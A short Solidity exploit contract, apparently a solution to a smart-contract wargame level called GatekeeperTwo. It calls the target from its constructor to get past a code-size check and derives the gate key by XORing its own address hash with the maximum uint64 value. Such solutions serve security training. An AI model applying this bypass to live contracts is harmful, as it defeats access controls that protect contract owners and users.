// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = IGatekeeperTwo(_gatekeeperTwo);
        attack();
    }

    function attack() public {
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeperTwo.enter(gateKey);
    }
}